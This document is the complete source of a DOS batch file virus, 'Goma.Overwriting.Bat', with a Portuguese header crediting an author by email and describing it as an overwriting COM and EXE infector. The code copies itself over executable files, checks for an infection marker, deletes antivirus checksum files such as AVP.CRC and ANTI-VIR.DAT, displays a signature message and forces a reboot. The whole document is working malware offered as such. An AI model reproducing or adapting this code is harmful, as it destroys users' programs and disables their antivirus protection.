REM ****************** Goma.Overwriting.Bat.Compiled ************************
REM        Nome do virus: Goma.Overwriting.Bat
REM        Autor : nim_bus@hotmail.com
REM        Tipo : Runtime Overwriting , COM e EXE infector .
REM        Tamanho : 4301 bytes
REM        Av's : none
REM        Retro : apagar arquivos de verificacao
REM        Ativacao : mensagem, diretorio, beep e fechar a tarefa !
REM        Bug's : favor entrar em contato caso voce detecte algum ...
REM        Compilar/linkar com TurboBat 3.?? ou uuencoda ele !
REM *************************************************************************
:inicio

:procura
for %%f in (..\*.com *.com ..\*.exe *.exe) do set var=%%f

:ja_infec
find /i "[TDG'2000]" <%var% >nul
if not errorlevel 1 GOTO fim

:infectar
echo s | copy %0 %var% > nul

:apagar
DELTREE /Y SMARTCHK.CPS > nul
DELTREE /Y ANTI-VIR.DAT > nul
DELTREE /Y AVP.CRC      > nul
DELTREE /Y IVB.NTZ      > nul
DELTREE /Y CHKLIST.MS   > nul


:zoa
ECHO. [TDG'2000]            Goma.Overwriting.Bat.Compiled           [TDG'2000]
ECHO.
ECHO.                  Um novo conceito em v¡rus de computador
ECHO.
ECHO. [TDG'2000]            Goma.Overwriting.Bat.Compiled           [TDG'2000]
MD þÿGomaÿþ >nul
BEEP 440 40

:fim
set var=
BOOT WARM
REM ****************** Goma.Overwriting.Bat.Compiled ************************
